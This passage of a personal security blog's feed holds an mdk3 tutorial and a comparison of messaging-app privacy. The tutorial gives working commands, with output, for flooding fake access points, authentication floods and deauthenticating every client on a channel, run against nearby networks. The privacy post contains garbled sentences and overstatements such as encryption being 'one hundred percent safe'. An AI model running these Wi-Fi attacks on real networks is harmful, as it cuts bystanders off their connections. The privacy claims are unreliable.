+  &lt;li&gt;Sends beacon frames to show fake APs at clients. (&lt;strong&gt;&lt;em&gt;Beacon Flooding&lt;/em&gt;&lt;/strong&gt;)&lt;/li&gt;
+  &lt;li&gt;Sends authentication frames to all APs found in range. (&lt;strong&gt;&lt;em&gt;Authentication DoS&lt;/em&gt;&lt;/strong&gt;)&lt;/li&gt;
+  &lt;li&gt;Kicks everybody found from AP. (&lt;strong&gt;&lt;em&gt;Deauthentication / Disassociation Amok&lt;/em&gt;&lt;/strong&gt;)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;you-need&quot;&gt;You need…&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Linux based system.&lt;/li&gt;
+  &lt;li&gt;mdk3 installed&lt;/li&gt;
+  &lt;li&gt;Wireless card&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;install-mdk3&quot;&gt;Install mdk3&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;mdk3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If mdk3 is successfully installed, try to run it!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[theodore@parrot]─[~]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;theodore: 
+
+MDK 3.0 v6 - &lt;span class=&quot;s2&quot;&gt;&quot;Yeah, well, whatever&quot;&lt;/span&gt;
+by ASPj of k2wrlz, using the osdep library from aircrack-ng
+And with lots of &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;from the great aircrack-ng community:
+Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
+telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
+THANK YOU!
+
+MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
+IMPORTANT: It is your responsibility to make sure you have permission from the
+network owner before running MDK against it.
+
+This code is licenced under the GPLv2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;check-the-wireless-card&quot;&gt;Check the wireless card&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; ifconfig
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For me, my card’s name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlx48022a54bc53&lt;/code&gt;, in this article I will use the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlan0&lt;/code&gt; instead of this.&lt;/p&gt;
+
+&lt;h2 id=&quot;beacon-flooding&quot;&gt;Beacon Flooding&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Set the wireless card to &lt;strong&gt;Monitor Mode&lt;/strong&gt;:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; airmon-ng start wlan0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[theodore@parrot]─[~]
+└──╼ &lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; airmon-ng start wlx48022a54bc53
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;theodore: 
+
+Found 2 processes that could cause trouble.
+Kill them using &lt;span class=&quot;s1&quot;&gt;'airmon-ng check kill'&lt;/span&gt; before putting
+the card &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;monitor mode, they will interfere by changing channels
+and sometimes putting the interface back &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;managed mode
+
+    PID Name
+    679 NetworkManager
+    693 wpa_supplicant
+
+PHY	Interface	Driver		Chipset
+
+phy0	wlx48022a54bc53	rt2800usb	Ralink Technology, Corp. RT2870/RT3070
+Interface wlx48022a54bc53mon is too long &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux so it will be renamed to the old style &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wlan#&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; name.
+
+		&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mac80211 monitor mode vif enabled on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlan0mon
+		&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mac80211 station mode vif disabled &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlx48022a54bc53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;(mac80211 monitor mode vif enabled on [phy0]&lt;strong&gt;&lt;em&gt;wlan0mon&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Create fake APs:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon b &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; WIFI_NAME &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 6 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 80 	
+&lt;span class=&quot;c&quot;&gt;# after arg `-c` is the channel,&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# `-s` sets the speed in packets per second (Default: 50)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/mdk3/fakeAP.jpeg&quot; alt=&quot;Fake AP&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ps1-mass-create-fake-aps&quot;&gt;P.S.1. Mass create fake APs&lt;/h3&gt;
+
+&lt;p&gt;Firstly, create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wifi_list.txt&lt;/code&gt; file, in the file stored all the AP’s names you want to create.&lt;/p&gt;
+
+&lt;p&gt;For example:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AP-0
+AP-1
+AP-2
+AP-3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, start mdk3 with this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon b &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /path/to/wifi_list.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 6 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/mdk3/massFake.jpeg&quot; alt=&quot;Mass Created AP&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;ps2-create-fake-aps-with-random-names&quot;&gt;P.S.2. Create fake APs with random names&lt;/h3&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;authentication-dos&quot;&gt;Authentication DoS&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Sends authentication frames to all APs found in range.
+Too much clients freeze or reset some APs.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;In some cases, the AP won’t freeze or reset, and even if it will not, it’s Internet speed will be very slow and hard to use.&lt;/p&gt;
+
+&lt;p&gt;See all AP nearby:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; airodump-ng wlan0mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CH  6 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 1 min &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2021-11-20 20:59 
+
+ BSSID              PWR  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSI&lt;/span&gt;
+
+ 48:0E:EC:A1:8D:3F   &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;        0        1    0   7   &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;   WPA              &amp;lt;len
+ 00:1F:7A:52:62:B1   &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;        0        0    0   6   &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;                    &amp;lt;len
+ 88:C3:97:F0:D0:4C  &lt;span class=&quot;nt&quot;&gt;-23&lt;/span&gt;       52        0    0   6  195   WPA2 CCMP   PSK  
+ 90:47:3C:06:7E:F0  &lt;span class=&quot;nt&quot;&gt;-37&lt;/span&gt;       34        0    0   5  130   WPA2 CCMP   PSK  
+ A8:C2:52:02:FC:A1  &lt;span class=&quot;nt&quot;&gt;-45&lt;/span&gt;       37        0    0   1  270   WPA2 CCMP   PSK  &amp;lt;len
+ A8:C2:52:02:FC:A0  &lt;span class=&quot;nt&quot;&gt;-45&lt;/span&gt;       29        3    0   1  270   WPA2 CCMP   PSK  
+ 7C:94:2A:88:CA:94  &lt;span class=&quot;nt&quot;&gt;-45&lt;/span&gt;       34        0    0   6  270   WPA2 CCMP   PSK  
+ A8:C2:52:02:FC:A5  &lt;span class=&quot;nt&quot;&gt;-45&lt;/span&gt;       27        0    0   1  270   WPA2 CCMP   PSK  &amp;lt;len
+ 7C:94:2A:88:CA:95  &lt;span class=&quot;nt&quot;&gt;-69&lt;/span&gt;       27        0    0   6  270   WPA2 CCMP   PSK  &amp;lt;len
+ 08:F4:58:D2:66:FD  &lt;span class=&quot;nt&quot;&gt;-51&lt;/span&gt;       26        0    0  11  360   WPA2 CCMP   PSK  &amp;lt;len
+ 08:F4:58:D2:66:F8  &lt;span class=&quot;nt&quot;&gt;-51&lt;/span&gt;       29        1    0  11  360   WPA2 CCMP   PSK  
+ 9C:A6:15:6D:BA:DB  &lt;span class=&quot;nt&quot;&gt;-50&lt;/span&gt;       22        0    0  11  405   WPA2 CCMP   PSK  
+ E4:BD:4B:AB:AD:08  &lt;span class=&quot;nt&quot;&gt;-53&lt;/span&gt;       38        0    0   4  130   WPA2 CCMP   PSK  
+ 08:F4:58:D2:66:F9  &lt;span class=&quot;nt&quot;&gt;-50&lt;/span&gt;       38        2    0  11  400   OPN              
+ 14:AD:CA:3A:21:5E  &lt;span class=&quot;nt&quot;&gt;-53&lt;/span&gt;       39        0    0   8  270   WPA2 CCMP   PSK  
+ E2:92:66:99:A8:0F  &lt;span class=&quot;nt&quot;&gt;-52&lt;/span&gt;        0        1    0   6  130   WPA2 CCMP   PSK  
+ 74:54:27:60:F0:1A  &lt;span class=&quot;nt&quot;&gt;-53&lt;/span&gt;       33        4    0   1  540   WPA2 CCMP   PSK  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Start attack.&lt;/p&gt;
+
+&lt;p&gt;Command:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon a &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; TARGET_MAC_ADDRESS
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;deauthentication--disassociation-amok&quot;&gt;Deauthentication / Disassociation Amok&lt;/h2&gt;
+
+&lt;p&gt;From &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo airodump-ng wlan0mon&lt;/code&gt; we get a lot of information. Access points, mac IDs, clients, channel on which each AP broadcasts etc. Now we choose a channel to attack against.&lt;/p&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; mdk3 wlan0mon d &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 11 	&lt;span class=&quot;c&quot;&gt;#launch an attack against channel 11&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Linux" /><category term="Pentest" /><category term="Linux" /><category term="Pentest" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/mdk3/mdk3-cover.jpeg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/mdk3/mdk3-cover.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Is Telegram really anonymous &amp;amp; “focus on privacy” as it advertises? IM software comparison</title><link href="https://theodorecooper.github.io/others/pentest/2021-telegram/" rel="alternate" type="text/html" title="Is Telegram really anonymous &amp;amp; “focus on privacy” as it advertises? IM software comparison" /><published>2021-09-21T00:00:00-04:00</published><updated>2021-11-20T04:06:52-05:00</updated><id>https://theodorecooper.github.io/others/pentest/telegram</id><content type="html" xml:base="https://theodorecooper.github.io/others/pentest/2021-telegram/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;Now, more and more people wants to be &lt;strong&gt;anonymous&lt;/strong&gt;. The anonymity in everyday life enables people to be free to do many worthwhile things without feeling inhibited. Telegram, an IM known as &lt;em&gt;“focus on security and privacy”&lt;/em&gt;, is chosen. 
+But, does Telegram really &lt;em&gt;“focus on security and privacy”&lt;/em&gt; as it advertises? 
+Today, we’ll compare Telegram with other IM software. I’ll show you different softwares’ advantage and disadvantage, and help you decide which one to choose.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-im&quot;&gt;What is IM?&lt;/h2&gt;
+&lt;p&gt;Instant messaging (&lt;strong&gt;IM&lt;/strong&gt;) technology is a type of online chat allowing real-time text transmission over the Internet or another computer network. 
+Some example of IM:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;WhatsApp&lt;/li&gt;
+  &lt;li&gt;Slack&lt;/li&gt;
+  &lt;li&gt;Jabber&lt;/li&gt;
+  &lt;li&gt;Spark&lt;/li&gt;
+  &lt;li&gt;Telegram&lt;/li&gt;
+  &lt;li&gt;Signal&lt;/li&gt;
+  &lt;li&gt;. . .&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;about-telegram&quot;&gt;About Telegram&lt;/h2&gt;
+
+&lt;h3 id=&quot;what-is-telegram&quot;&gt;What is Telegram?&lt;/h3&gt;
+&lt;p&gt;Copied from Wikipedia😝:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Telegram is a free and open source, cross-platform, cloud-based instant messaging (IM) software. This service also provides end-to-end encrypted video calling, VoIP, file sharing and several other features.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;advantages-of-telegram&quot;&gt;Advantages of Telegram&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Telegram provides end-to-end encrypted voice and video calls and optional end-to-end encrypted “secret” chats. Cloud chats and groups are encrypted between the app and the server, so that ISPs and other third-parties on the network can’t access data, but the Telegram server can. Users can send text and voice messages, make voice and video calls, and share an unlimited number of images, documents (2 GB per file), user locations, animated stickers, contacts, and audio files.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Easy to use, user-friendly&lt;/li&gt;
+  &lt;li&gt;Nice User Interface&lt;/li&gt;
+  &lt;li&gt;Cross-platform(Windows, Android, iOS, OSX, Linux…)&lt;/li&gt;
+  &lt;li&gt;Support setting chat records to be destroyed regularly&lt;/li&gt;
+  &lt;li&gt;Support  deleting account, after deleting the account, all related information will be destroyed at the same time&lt;/li&gt;
+  &lt;li&gt;Free, non-profit, never sell advertisements, never accept external investment&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;disadvantages-of-telegram&quot;&gt;Disadvantages of Telegram&lt;/h3&gt;
+&lt;p&gt;Well, no data will be collected while using Telegram, end-to-end encryption is one hundred percent safe, but it doesn’t mean that &lt;em&gt;Telegram&lt;/em&gt; is anoymous.
+In fact, Telegram has no &lt;strong&gt;anonymity&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;1-bind-phone-number&quot;&gt;1. Bind phone number&lt;/h4&gt;
+&lt;p&gt;Any network tool that needs to be bound to a mobile phone (whether it is IM or email) will greatly reduce your invisibility.
+AnyoneGet contacts automatically once owns the phone number has the complete control over the Telegram account. I will talk about the issue of mobile phone number and anonymity below.
+Anyway, &lt;em&gt;be sure to have control over the bound mobile phone number!&lt;/em&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;2-get-contactscan-be-solved&quot;&gt;2. Get contacts[can be solved]&lt;/h4&gt;
+&lt;p&gt;Telegram will scan your phone coanonymityntact and import numbers from it.
+&lt;strong&gt;Your can disable this function however.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;3-last-seen-timecan-be-solved&quot;&gt;3. Last seen time[can be solved]&lt;/h4&gt;
+&lt;p&gt;Telegram will show your “Last seen time” defaultly, it may affect anonymity.
+So, it’s neccessary to set “Do not show last seen time” in Telegram. In some groups, Telegram will show accounts which is typing, there’s also a way to avoid this. Put your full name into line editor “Last Name” and leave a space in “FIrst Name”. Then your typing state won’t be shown.&lt;/p&gt;
+
+&lt;h2 id=&quot;about-phone-numbers&quot;&gt;About phone numbers&lt;/h2&gt;
+
+&lt;h3 id=&quot;physical-sim-cards&quot;&gt;Physical SIM cards&lt;/h3&gt;
+&lt;p&gt;In some countries, you’ll need to offer your true identity to get a SIM card. Obviously, it’s quite hard to keep anonymous with a physical SIM card.&lt;/p&gt;
+
+&lt;h3 id=&quot;voip&quot;&gt;VoIP&lt;/h3&gt;
+&lt;p&gt;Free VoIPs are hard to get, and many of them have short avalible time. 
+Moreover, using VoIP will have the risk of being deleted in Telegram(Deleted Account).&lt;/p&gt;
+
+&lt;h2 id=&quot;other-ims&quot;&gt;Other IMs&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/whatsapp.jpeg&quot; alt=&quot;WhatsApp&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;whatsapp&quot;&gt;WhatsApp:&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;[✔️] User-friendly&lt;/li&gt;
+  &lt;li&gt;[❌] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[❓] Safety.&lt;/li&gt;
+  &lt;li&gt;[❌] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[✔️] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/signal.png&quot; alt=&quot;Signal&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;signal&quot;&gt;Signal:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[❌] User-friendly&lt;/li&gt;
+  &lt;li&gt;[❌] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[✔️] Safety.&lt;/li&gt;
+  &lt;li&gt;[❌] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[✔️] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/element.png&quot; alt=&quot;Element&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;elementriot&quot;&gt;Element(Riot):&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[✔️] User-friendly&lt;/li&gt;
+  &lt;li&gt;[✔️] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[✔️] Safety.&lt;/li&gt;
+  &lt;li&gt;[❌] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[❌] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/wire.jpeg&quot; alt=&quot;Wire&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;wire&quot;&gt;Wire:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[❌] User-friendly&lt;/li&gt;
+  &lt;li&gt;[✔️] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[✔️] Safety.&lt;/li&gt;
+  &lt;li&gt;[❌] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[❌] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/discord.png&quot; alt=&quot;Discord&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;discord&quot;&gt;Discord:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[✔️] User-friendly&lt;/li&gt;
+  &lt;li&gt;[❌] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[❓] Safety.&lt;/li&gt;
+  &lt;li&gt;[❌] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[✔️] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/wechat.jpeg&quot; alt=&quot;Wechat&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;wechat&quot;&gt;Wechat:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[❓] User-friendly&lt;/li&gt;
+  &lt;li&gt;[❌] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[❌] Safety.&lt;/li&gt;
+  &lt;li&gt;[❌] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[✔️] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/messenger.png&quot; alt=&quot;Messenger&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;messenger&quot;&gt;Messenger:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[❓] User-friendly&lt;/li&gt;
+  &lt;li&gt;[❌] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[❌] Safety.&lt;/li&gt;
+  &lt;li&gt;[❌] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[✔️] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/tox.png&quot; alt=&quot;Tox&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;tox&quot;&gt;Tox:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[❌] User-friendly&lt;/li&gt;
+  &lt;li&gt;[✔️] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[✔️] Do not need to bind email.&lt;/li&gt;
+  &lt;li&gt;[✔️] Safety.&lt;/li&gt;
+  &lt;li&gt;[✔️] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[❌] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;bitmessage&quot;&gt;BitMessage:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[❌] User-friendly&lt;/li&gt;
+  &lt;li&gt;[✔️] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[✔️] Do not need to bind email.&lt;/li&gt;
+  &lt;li&gt;[✔️] Safety.&lt;/li&gt;
+  &lt;li&gt;[✔️] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[❌] Is it popular?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/telegram/bridgefy.png&quot; alt=&quot;Bridgefy&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;bridgefy&quot;&gt;Bridgefy:&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;[❌] User-friendly&lt;/li&gt;
+  &lt;li&gt;[✔️] Do not need to bind phone numbers.&lt;/li&gt;
+  &lt;li&gt;[✔️] Do not need to bind email.&lt;/li&gt;
+  &lt;li&gt;[❌] Safety.&lt;/li&gt;
+  &lt;li&gt;[❌] Anonymity.&lt;/li&gt;
+  &lt;li&gt;[❌] Is it popular?&lt;/li&gt;
+  &lt;li&gt;[✔️] Offline messaging.&lt;/li&gt;
+  &lt;li&gt;[❌ Only iOS &amp;amp; Android]Cross-platform&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;ideal-im&quot;&gt;Ideal IM…&lt;/h2&gt;
+
+&lt;p&gt;All the mentioned IMs have their own advantages and disadvantages, so what is the best one? My answer is: neither of them. Which one to choose depends on your own ideas. For me, Telegram is safe enough and user-friendly.&lt;/p&gt;
+
+&lt;h2 id=&quot;ps-tips-while-using-telegram&quot;&gt;PS: Tips while using Telegram&lt;/h2&gt;
+
+&lt;h3 id=&quot;1-set-passcode--face-id&quot;&gt;1. Set Passcode &amp;amp; Face ID&lt;/h3&gt;
+&lt;p&gt;To prevent others from peeking at the messages when the phone isn’t around.&lt;/p&gt;
+
+&lt;h3 id=&quot;2-two-step-verification&quot;&gt;2. Two-step verification&lt;/h3&gt;
+
+&lt;h3 id=&quot;3-privacy-settings&quot;&gt;3. Privacy Settings&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;No one can see my numbers&lt;/li&gt;
+  &lt;li&gt;No one can see my last seen time&lt;/li&gt;
+  &lt;li&gt;Only contact can see profile photos&lt;/li&gt;
+  &lt;li&gt;Only contact can call me&lt;/li&gt;
+  &lt;li&gt;Only contact can add me in a group&lt;/li&gt;
+  &lt;li&gt;Avoid using true numbers, use a VoIP instead&lt;/li&gt;
+  &lt;li&gt;Use proxy&lt;/li&gt;
+  &lt;li&gt;. . .&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Others" /><category term="Pentest" /><category term="Others" /><category term="Pentest" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/telegram/telegram-cover.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/telegram/telegram-cover.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">[Download]Collection of the best &amp;amp; most popular DDos-attack tools</title><link href="https://theodorecooper.github.io/pentest/2021-ddos-tools/" rel="alternate" type="text/html" title="[Download]Collection of the best &amp;amp; most popular DDos-attack tools" 